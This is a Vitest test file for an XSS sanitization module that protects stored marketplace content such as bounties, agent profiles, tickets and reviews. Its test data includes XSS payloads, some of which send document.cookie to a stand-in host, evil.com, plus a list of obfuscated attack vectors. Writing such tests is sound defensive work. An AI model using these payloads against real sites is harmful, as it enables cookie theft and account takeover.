import { describe, it, expect } from "vitest";
import {
  sanitizeForStorage,
  sanitizeContentForStorage,
  sanitizeBountyContent,
  sanitizeAgentContent,
  sanitizeSubmissionContent,
  sanitizeTicketContent,
  sanitizeProfileContent,
  sanitizeDiscussionContent,
  isContentSafe,
  detectUnsafeContent,
} from "../xssProtection";

describe("XSS Protection for Stored Content", () => {
  describe("sanitizeForStorage", () => {
    it("escapes HTML tags in stored content", () => {
      const input = "<script>alert('xss')</script>";
      const result = sanitizeForStorage(input);
      expect(result).not.toContain("<script>");
      expect(result).toContain("&lt;script&gt;");
    });

    it("escapes IMG tags with event handlers", () => {
      const input = '<img src=x onerror="alert(1)">';
      const result = sanitizeForStorage(input);
      expect(result).not.toContain("<img");
      expect(result).not.toContain("onerror");
    });

    it("escapes SVG with onload", () => {
      const input = '<svg onload="alert(1)">';
      const result = sanitizeForStorage(input);
      expect(result).not.toContain("<svg");
      expect(result).not.toContain("onload");
    });

    it("neutralizes javascript: URLs", () => {
      const input = 'javascript:alert(1)';
      const result = sanitizeForStorage(input);
      expect(result).not.toContain("javascript:");
    });

    it("neutralizes data: URLs", () => {
      const input = 'data:text/html,<script>alert(1)</script>';
      const result = sanitizeForStorage(input);
      expect(result).toContain("data\u200B:");
    });

    it("escapes template literals", () => {
      const input = "`${document.cookie}`";
      const result = sanitizeForStorage(input);
      expect(result).not.toContain("`");
      expect(result).toContain("&#x60;");
    });

    it("preserves safe content", () => {
      const input = "Hello World! This is safe content.";
      const result = sanitizeForStorage(input);
      expect(result).toBe("Hello World! This is safe content.");
    });

    it("handles non-string input gracefully", () => {
      expect(sanitizeForStorage(null as any)).toBe("");
      expect(sanitizeForStorage(undefined as any)).toBe("");
      expect(sanitizeForStorage(123 as any)).toBe("");
    });
  });

  describe("sanitizeContentForStorage", () => {
    it("sanitizes specified fields in an object", () => {
      const input = {
        title: "<script>alert(1)</script>",
        description: '<img src=x onerror="alert(2)">',
        count: 42,
      };
      const result = sanitizeContentForStorage(input);
      expect(result.title).not.toContain("<script>");
      expect(result.description).not.toContain("<img");
      expect(result.count).toBe(42);
    });

    it("sanitizes nested objects", () => {
      const input = {
        outer: {
          title: "<script>alert(1)</script>",
        },
      };
      const result = sanitizeContentForStorage(input);
      expect(result.outer.title).not.toContain("<script>");
    });

    it("preserves structured data fields", () => {
      const input = {
        title: "<b>Test</b>",
        metadata: { key: "<value>" },
        tags: ["<tag1>", "<tag2>"],
      };
      const result = sanitizeContentForStorage(input);
      expect(result.title).not.toContain("<b>");
      // Structured data fields should be preserved
      expect(result.metadata).toEqual({ key: "<value>" });
      expect(result.tags).toEqual(["<tag1>", "<tag2>"]);
    });

    it("allows custom field specification", () => {
      const input = {
        customField: "<script>alert(1)</script>",
        otherField: "<script>alert(2)</script>",
      };
      const result = sanitizeContentForStorage(input, ["customField"]);
      expect(result.customField).not.toContain("<script>");
      expect(result.otherField).toBe("<script>alert(2)</script>");
    });

    it("handles null and undefined values", () => {
      const input = {
        title: null,
        description: undefined,
        name: "Test",
      };
      const result = sanitizeContentForStorage(input as any);
      expect(result.title).toBeNull();
      expect(result.description).toBeUndefined();
      expect(result.name).toBe("Test");
    });
  });

  describe("sanitizeBountyContent", () => {
    it("sanitizes bounty-specific fields", () => {
      const bounty = {
        title: "<script>Steal Cookies</script>",
        description: '<img src=x onerror="document.location=\'evil.com\'">',
        requirements: '<a href="javascript:alert(1)">Click me</a>',
        reward: "1000",
        posterId: "user123",
      };
      const result = sanitizeBountyContent(bounty);
      expect(result.title).not.toContain("<script>");
      expect(result.description).not.toContain("<img");
      expect(result.requirements).not.toContain("javascript:");
      expect(result.reward).toBe("1000");
      expect(result.posterId).toBe("user123");
    });
  });

  describe("sanitizeAgentContent", () => {
    it("sanitizes agent-specific fields", () => {
      const agent = {
        name: "<script>Evil Agent</script>",
        description: '<svg onload="alert(1)">',
        bio: '<body onload="alert(1)">',
        developerId: "dev123",
        rating: 4.5,
      };
      const result = sanitizeAgentContent(agent);
      expect(result.name).not.toContain("<script>");
      expect(result.description).not.toContain("<svg");
      expect(result.bio).not.toContain("onload");
      expect(result.developerId).toBe("dev123");
      expect(result.rating).toBe(4.5);
    });
  });

  describe("sanitizeSubmissionContent", () => {
    it("sanitizes submission/review fields", () => {
      const submission = {
        comment: '<iframe src="evil.com"></iframe>',
        content: '<embed src="malware.swf">',
        message: '<object data="virus.exe">',
        submissionId: 123,
      };
      const result = sanitizeSubmissionContent(submission);
      expect(result.comment).not.toContain("<iframe");
      expect(result.content).not.toContain("<embed");
      expect(result.message).not.toContain("<object");
      expect(result.submissionId).toBe(123);
    });
  });

  describe("sanitizeTicketContent", () => {
    it("sanitizes support ticket/dispute fields", () => {
      const ticket = {
        subject: '<script>document.cookie</script>',
        description: '<form action="phishing.com">',
        message: '<input type="hidden" value="stolen">',
        resolution: '<button onclick="evil()">Click</button>',
        ticketId: 456,
      };
      const result = sanitizeTicketContent(ticket);
      expect(result.subject).not.toContain("<script>");
      expect(result.description).not.toContain("<form");
      expect(result.message).not.toContain("<input");
      expect(result.resolution).not.toContain("onclick");
      expect(result.ticketId).toBe(456);
    });
  });

  describe("sanitizeProfileContent", () => {
    it("sanitizes user profile fields", () => {
      const profile = {
        name: '<marquee>Hacker</marquee>',
        bio: '<style>body { display: none; }</style>',
        description: '<link rel="stylesheet" href="evil.css">',
        userId: "user789",
      };
      const result = sanitizeProfileContent(profile);
      expect(result.name).not.toContain("<marquee");
      expect(result.bio).not.toContain("<style");
      expect(result.description).not.toContain("<link");
      expect(result.userId).toBe("user789");
    });
  });

  describe("sanitizeDiscussionContent", () => {
    it("sanitizes discussion/comment fields", () => {
      const discussion = {
        title: '<meta http-equiv="refresh" content="0;url=evil.com">',
        content: '<base href="https://evil.com">',
        body: '<applet code="evil.class">',
        authorId: "author123",
      };
      const result = sanitizeDiscussionContent(discussion);
      expect(result.title).not.toContain("<meta");
      expect(result.content).not.toContain("<base");
      expect(result.body).not.toContain("<applet");
      expect(result.authorId).toBe("author123");
    });
  });

  describe("isContentSafe", () => {
    it("returns true for safe content", () => {
      expect(isContentSafe("Hello World")).toBe(true);
      expect(isContentSafe("This is a normal sentence.")).toBe(true);
      expect(isContentSafe("Price: $100")).toBe(true);
    });

    it("returns false for script tags", () => {
      expect(isContentSafe("<script>alert(1)</script>")).toBe(false);
      expect(isContentSafe("<SCRIPT>alert(1)</SCRIPT>")).toBe(false);
    });

    it("returns false for javascript: URLs", () => {
      expect(isContentSafe("javascript:alert(1)")).toBe(false);
      expect(isContentSafe("JAVASCRIPT:alert(1)")).toBe(false);
    });

    it("returns false for event handlers", () => {
      expect(isContentSafe('onclick="alert(1)"')).toBe(false);
      expect(isContentSafe('onerror = "alert(1)"')).toBe(false);
      expect(isContentSafe("onmouseover=alert(1)")).toBe(false);
    });

    it("returns false for dangerous tags", () => {
      expect(isContentSafe("<iframe src='evil.com'></iframe>")).toBe(false);
      expect(isContentSafe("<object data='virus.exe'></object>")).toBe(false);
      expect(isContentSafe("<embed src='malware.swf'>")).toBe(false);
      expect(isContentSafe("<form action='phishing.com'>")).toBe(false);
    });

    it("returns false for data: HTML URLs", () => {
      expect(isContentSafe("data:text/html,<script>alert(1)</script>")).toBe(
        false
      );
    });

    it("returns false for SVG/IMG with event handlers", () => {
      expect(isContentSafe('<svg onload="alert(1)">')).toBe(false);
      expect(isContentSafe('<img onerror="alert(1)">')).toBe(false);
    });

    it("handles non-string input", () => {
      expect(isContentSafe(null as any)).toBe(true);
      expect(isContentSafe(undefined as any)).toBe(true);
      expect(isContentSafe(123 as any)).toBe(true);
    });
  });

  describe("detectUnsafeContent", () => {
    it("detects unsafe content in flat objects", () => {
      const data = {
        title: "Safe title",
        description: "<script>alert(1)</script>",
        content: '<img onerror="alert(2)">',
      };
      const unsafe = detectUnsafeContent(data);
      expect(unsafe).toContain("description");
      expect(unsafe).toContain("content");
      expect(unsafe).not.toContain("title");
    });

    it("detects unsafe content in nested objects", () => {
      const data = {
        outer: {
          inner: "<script>alert(1)</script>",
        },
      };
      const unsafe = detectUnsafeContent(data);
      expect(unsafe).toContain("outer.inner");
    });

    it("detects unsafe content in arrays", () => {
      const data = {
        items: ["safe", "<script>alert(1)</script>", "also safe"],
      };
      const unsafe = detectUnsafeContent(data);
      expect(unsafe).toContain("items[1]");
      expect(unsafe).not.toContain("items[0]");
      expect(unsafe).not.toContain("items[2]");
    });

    it("detects unsafe content in array of objects", () => {
      const data = {
        items: [
          { title: "Safe" },
          { title: "<script>alert(1)</script>" },
        ],
      };
      const unsafe = detectUnsafeContent(data);
      expect(unsafe).toContain("items[1].title");
    });

    it("returns empty array for safe content", () => {
      const data = {
        title: "Safe title",
        description: "Safe description",
      };
      const unsafe = detectUnsafeContent(data);
      expect(unsafe).toHaveLength(0);
    });
  });

  describe("Real-world XSS Attack Vectors", () => {
    const attackVectors = [
      // Basic script injection
      "<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
      // IMG tag based
      '<img src="x" onerror="alert(document.cookie)">',
      // SVG based
      '<svg/onload=alert(document.cookie)>',
      // Body tag based
      '<body onload=alert(document.cookie)>',
      // Input based
      '<input onfocus=alert(document.cookie) autofocus>',
      // Button based
      '<button onclick=alert(document.cookie)>Click me</button>',
      // Link based
      '<a href="javascript:alert(document.cookie)">Click me</a>',
      // CSS expression (older IE)
      '<div style="background:url(javascript:alert(1))">',
      // Data URL
      '<a href="data:text/html,<script>alert(1)</script>">Click</a>',
      // Unicode obfuscation
      "<script>\u0061lert(1)</script>",
      // HTML entities obfuscation
      "&#60;script&#62;alert(1)&#60;/script&#62;",
      // Iframe injection
      '<iframe src="javascript:alert(1)">',
      // Object/Embed
      '<object data="javascript:alert(1)">',
      '<embed src="javascript:alert(1)">',
      // Event handlers with whitespace
      '<img src=x onerror  =  "alert(1)">',
      // Mixed case
      '<ScRiPt>alert(1)</sCrIpT>',
      // Template literal exploitation
      '`${alert(document.domain)}`',
    ];

    attackVectors.forEach((vector, index) => {
      it(`neutralizes attack vector #${index + 1}`, () => {
        const result = sanitizeForStorage(vector);
        // Result should be safe
        expect(isContentSafe(result)).toBe(true);
        // Should not contain raw dangerous patterns
        expect(result).not.toMatch(/<script/i);
        expect(result).not.toMatch(/javascript:/i);
        expect(result).not.toMatch(/on\w+\s*=/i);
      });
    });
  });

  describe("Stored XSS Prevention Scenarios", () => {
    it("prevents stored XSS in bounty titles displayed in lists", () => {
      const bountyData = {
        title: '<img src=x onerror="fetch(\'evil.com/steal?c=\'+document.cookie)">',
        description: "Normal description",
        reward: "500",
      };
      const sanitized = sanitizeBountyContent(bountyData);
      // When rendered in HTML, this should be safe
      expect(sanitized.title).not.toContain("<img");
      expect(sanitized.title).not.toContain("onerror");
    });

    it("prevents stored XSS in agent descriptions on marketplace", () => {
      const agentData = {
        name: "Helpful Agent",
        description: '<script>new Image().src="http://evil.com/steal?c="+document.cookie;</script>',
      };
      const sanitized = sanitizeAgentContent(agentData);
      expect(sanitized.description).not.toContain("<script>");
    });

    it("prevents stored XSS in review comments", () => {
      const reviewData = {
        comment: '<svg/onload=alert("XSS via stored review comment")>',
        rating: 5,
      };
      const sanitized = sanitizeSubmissionContent(reviewData);
      expect(sanitized.comment).not.toContain("<svg");
      expect(sanitized.comment).not.toContain("onload");
    });

    it("prevents stored XSS in support ticket messages", () => {
      const ticketData = {
        subject: "Help needed",
        message: '<body onload="document.location=\'http://phishing.com\'">',
      };
      const sanitized = sanitizeTicketContent(ticketData);
      expect(sanitized.message).not.toContain("<body");
      expect(sanitized.message).not.toContain("onload");
    });

    it("prevents stored XSS in user profile bio", () => {
      const profileData = {
        name: "John Doe",
        bio: '<meta http-equiv="refresh" content="0;url=http://evil.com">',
      };
      const sanitized = sanitizeProfileContent(profileData);
      expect(sanitized.bio).not.toContain("<meta");
    });

    it("prevents DOM clobbering attacks", () => {
      const data = {
        content: '<form id="document"><input name="cookie" value="stolen"></form>',
      };
      const sanitized = sanitizeSubmissionContent(data);
      expect(sanitized.content).not.toContain("<form");
      expect(sanitized.content).not.toContain("<input");
    });
  });
});
